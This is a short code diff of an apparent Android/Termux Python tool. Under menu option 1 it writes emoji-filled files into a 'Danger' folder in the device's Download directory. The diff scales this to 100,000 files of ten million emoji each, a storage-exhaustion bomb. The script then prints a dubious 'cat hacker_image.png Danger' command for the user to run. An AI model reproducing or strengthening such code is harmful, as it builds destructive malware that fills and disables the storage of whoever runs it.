@@ -32,9 +32,9 @@ if option == "1":
     danger_folder_path = os.path.join("/sdcard/Download", folder_name, "Danger")
     os.makedirs(danger_folder_path, exist_ok=True)
 
-    for i in range(1000):
+    for i in range(100000):
         with open(os.path.join(danger_folder_path, f"file_{i}.txt"), "w") as f:
-            f.write("😊" * 100000)
+            f.write("😊" * 10000000)
 
     print(Fore.BLUE + "Kindly Run cat hacker_image.png Danger > ak.png")
 else:
